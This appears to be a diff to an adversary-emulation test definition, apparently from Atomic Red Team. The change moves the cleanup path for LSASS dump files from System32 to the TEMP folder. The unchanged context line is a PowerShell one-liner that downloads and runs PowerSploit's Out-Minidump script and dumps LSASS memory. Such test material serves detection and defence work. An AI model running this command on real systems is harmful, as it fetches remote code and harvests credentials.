@@ -244,6 +244,6 @@ atomic_tests:
     command: |
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump
     cleanup_command: |
-      Remove-Item $env:SYSTEMROOT\System32\lsass_*.dmp -ErrorAction Ignore
+      Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
     name: powershell
     elevation_required: true
